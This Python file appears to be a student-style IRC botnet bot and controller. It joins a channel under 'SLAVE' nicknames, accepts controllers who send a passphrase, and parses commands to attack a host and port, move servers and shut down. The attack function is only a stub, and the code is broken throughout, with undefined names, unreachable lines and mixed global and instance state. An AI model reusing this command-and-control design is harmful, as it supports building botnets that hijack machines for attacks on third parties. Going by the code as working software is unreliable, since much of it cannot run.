import time
import socket 
import sys 
import threading
import random 

class Bot:
    
    def setup(self, host, port, channel, phrase):
        self.HOST = host
        self.PORT = int(port)
        self.CHANNEL = channel
        self.PHRASE = phrase
        self.IRCSOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # CONTROLLER INFO
        self.botNick = "SLAVE" + str(random.randrange(10000))
        self.liveConnection = False # Flag to see if controller connection to IRC Server is active
        self.command = None

        # BOT INFO
        self.botList = []
        self.botsSuccessful = []
        self.botsFailed = []
        self.botsMoved = []
        self.botsDisconnected = []
        self.acceptedCons = []

        try:
            self.IRCSOCKET.connect((self.HOST, self.PORT))
        except Exception as e:
            sys.stderr.write("Error: " + str(e))
            sys.exit(0)

        

    def IRCconnect(self):
        self.sendData("NICK {}\n" .format(self.botNick))
        self.sendData("USER bot * * :{}\n" .format(self.botNick))
        self.sendData("JOIN #{}\n" .format(self.CHANNEL))
        resp = self.getData()
        print(resp)
        return "433" in resp

    # PingPong protocol
    def pong(self):
        pass

    # Get response from Controller  
    def getData(self):
        return self.IRCSOCKET.recv(2048).decode().strip('\n\r')

    # Message Encoder
    def sendData(self, msg):
        self.IRCSOCKET.send(msg.encode())

    # Send to Controller 
    # Receiver should be CONBOT
    def privateMsg(self, receiver, msg):
        self.sendData("PRIVMSG {} :{}\n" .format(receiver, msg))

    # Send to Channel
    # Receiver should be CHANNEL
    def sendMsg(self, receiver, msg):
        self.sendData("PRIVMSG {} :{}\n" .format(receiver, msg))
    
    # Msg parser 
    def parseMsg(self, msg):
        prefix = ''
        trailing = []        
        if not msg:
            raise IRCBadMessage("Empty line.")
        if msg[0] == ':':            
            prefix, msg = msg[1:].split(' ', 1)
        if msg.find(' :') != -1:
            msg, trailing = msg.split(' :', 1)
            args = msg.split()
            args.append(trailing)
        else:
            args = msg.split()
        command = args.pop(0)
        return prefix, command, args

    # Gets response 
    def handleResponse(self, prefix, message):
        if message == self.PHRASE:
            self.acceptedCons.append(prefix)
        if prefix in self.acceptedCons:
            print("from " + prefix + " to do " + message)

    # COMMANDS TO DO -----------------------------------------------------------

    # Send Stats (Just the name of bot)
    def botStatus(self):
        global botNick
        sendPrivate("My name is: " + str(botNick))

    # Attack Server
    def botAttack(self, host, port):
        global conNick, botNick, attackCount 
        try:
            attackCount = attackCount + 1 
            # Send private message that attack was successful
            sendPrivate(str(botNick) + " has successdfully attacked server.\n current count: " + str(attackCount))
        except:
            pass 
            # Send private message that attack failed 
    
    # Move Server
    def botMove(self, newHost, newPort, newChannel):
        global HOST, PORT, CHANNEL, botNick 
        # First attempt to connect to new server 
        try:
            newSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            newSocket.connect((newHost, newPort))

            self.IRCSOCKET.send(msg.encode())
            # At this point, if it doesn't throw an exception, it should be good 
            # Now connect bot to channel
            
            newSocket.send(("NICK {}\n" .format(self.botNick)).encode())
            newSocket.send(("USER bot * * :{}\n" .format(self.botNick)).encode())
            newSocket.send(("JOIN #{}\n" .format(self.CHANNEL)).encode())
            resp = self.getData()
            print(resp)
            return "433" in resp

            # Disconnect from old Channel
            IRCSOCKET.close()

            # If it reaches this point, connection is successful. Change globals
            HOST = newHost 
            PORT = newPort 
            CHANNEL = newChannel 
            IRCSOCKET = newSocket 
            return True 
        except:
            print("ERROR: Unable to move to new channel\nBot still in old channel")
            return False 
        
    # Read
    def reader(self):
        try:
            while True:
                response = self.getData()
                #print(response)   
                if(response != ""):                                         
                        if response.find("PRIVMSG") != -1:                           
                            name = response.split('!',1)[0][1:]
                            message = response.split('PRIVMSG',1)[1].split(':',1)[1]
                            print("message from " + name + ": " + message)   
                            self.handleResponse(name, message)                               
                        elif response.find("PING") != -1:
                            self.sendData("PONG {}: :\r\n".format(self.HOST).encode("utf-8"))                                                                          
                        elif response.find('433') != -1:
                            self.createNick(self.NICK)
                            self.connectIRC(self.s,self.NICK, self.chan)  
        except Exception as e:
            print("Exception: ")
            print(e)
            print("Reconnecting in 5 seconds ...")
            time.sleep(5)
            self.reader()

    # Deal with commands 
    def commandHandler(self):
        while True:

            # Call the commands here
            userCommand = input("command> ")
            self.command = userCommand.split()
            # somewhere send phrase to bot
            # check command
            # send command to bots for them to do
            if (self.command[0] == "status"):
                self.sendCommand(self.command[0])
            elif (self.command[0] == "attack"):
                if (len(self.command) == 3):
                    self.botsSuccessful = []
                    self.botsFailed = []
                    hostTarget = command[1]
                    portTarget = command[2]
                    self.botAttack(hostTarget, portTarget)
                else:
                    print("Incorrect usage of command: attack <host-name> <port>")
            elif (self.command[0] == "move"):
                if(len(self.command) == 4):
                    self.botsMoved = []
                    newHost = command[1]
                    newPort = command[2]
                    newChannel = command[3]
                    self.botMove(newHost, newPort, newChannel)
                else:
                    print("Incorrect usage of command: move <host-name> <port> <channel>")
            elif (self.command[0] == "quit"):
                sys.exit(0)
            elif (self.command[0] == "shutdown"):
                self.botsDisconnected = []
                self.sendCommand(self.command[0])
            
def main():
    
    invalidNick = True
    noConnection = True
        # Get sys.argv
    if len(sys.argv) != 5:
        print("Wrong number of arguments")
        sys.exit() 
    
    HOST = sys.argv[1]
    PORT = sys.argv[2]
    CHANNEL = sys.argv[3]
    PHRASE = sys.argv[4]

    # Check if port is in valid range 
    if not PORT.isdigit():
        print("Invalid port.")
        sys.exit() 
    
    bot = Bot()

    # Keep connection to IRC server 
    while True:
        
        # set up controller bot and try to connect to the IRC
        try:
            print("setting up bot")
            bot.setup(HOST, PORT, CHANNEL, PHRASE)
        except Exception as e:
            print("{} Trying to reconnect..." .format(e))
            continue

        print("bot set up")
        print("connecting")
        while noConnection:
            noConnection = bot.IRCconnect()
        
        print("Controller is running. Connected with nick: " + bot.botNick)

        bot.reader()



if __name__ == "__main__":
    main()


